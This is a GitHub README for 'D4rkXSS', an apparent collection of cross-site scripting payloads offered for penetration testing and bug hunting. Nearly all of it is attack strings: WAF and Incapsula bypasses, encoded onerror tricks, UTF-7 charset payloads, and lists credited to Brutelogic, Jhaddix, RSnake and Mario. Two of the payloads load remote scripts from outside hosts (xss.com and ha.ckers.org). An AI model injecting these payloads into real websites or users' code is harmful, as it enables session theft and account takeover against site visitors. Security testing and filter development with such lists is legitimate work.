# D4rkXSS
<br/>
<p align="center">
	<img src="https://github.com/R0X4R/D4rkXSS/blob/master/imdge.png"><br/>
All in one place for XSS.<br/> <a href="https://eshansingh.in/">R0X4R</a></p>

# Contribution
This is an open source repo. Anyone can contribute. :beers: <br/>
	[![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoff.ee/R0X4R)

## Bypass WAF
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/noscript.txt">NO SCRIPT</a><br/>
<li>For Example:</li>

```js
<acronym><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
<bgsound><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
<xmp><p title="</#{endtag}><svg/onload=alert(#{starttag})>">
">'><details/open/ontoggle=confirm('XSS')>
incapsula bypass: <iframe/onload="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
```

<a href="https://github.com/R0X4R/D4rkXSS/blob/master/brutelogic.txt">Brutelogic</a><br/>
<li>For Example:</li>

```
\'-alert(1)//
</script><svg onload=alert(1)>
<x contenteditable onblur=alert(1)>lose focus!
```
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/fuzz.txt">Fuzz3r</a><br/>
<li>For Example:</li>

```
#getURL,javascript:alert(1)",
#goto,javascript:alert(1)",	
?javascript:alert(1)",

```
## IMG Error
<li>Encoding</li>

```
<img onerror="location='javascript:=lert(1)'" src="x">
<img onerror="location='javascript:%61lert(1)'" src="x">
<img onerror="location='javascript:\x2561lert(1)'" src="x">
<img onerror="location='javascript:\x255Cu0061lert(1)'" src="x" >
```


## Jhaddix
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/jhaddix.txt">Jhaddix</a><br/>
<li>For Example:</li>

```
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
<<scr\0ipt/src=http://xss.com/xss.js></script
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
' onmouseover=alert(/Black.Spook/)

```

## RSnake
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/rsnake.txt">RSnake</a><br/>
<li>For Example:</li>

```
<SCRIPT>alert('XSS');</SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>

```

## MarioXSS
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/mario.txt">Mario</a><br/>
<li>For Example:</li>

```
<div id="1"><form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>//["'`-->]]>]</div><div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div><div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div><div id="4">0?<script>
```
## Search Engine XSS
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/seXSS.md">seXSS</a><br/>

## Misc Payloads
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/Misc.md">Misc</a><br/>

## Basic Payloads
<a href="https://github.com/R0X4R/D4rkXSS/blob/master/basicxss.txt">Basic</a><br/>
<li>For Example:</li>

```
<script>alert('1')</script>
"><script>alert('1')</script>
<svg/onload=alert('1');
```
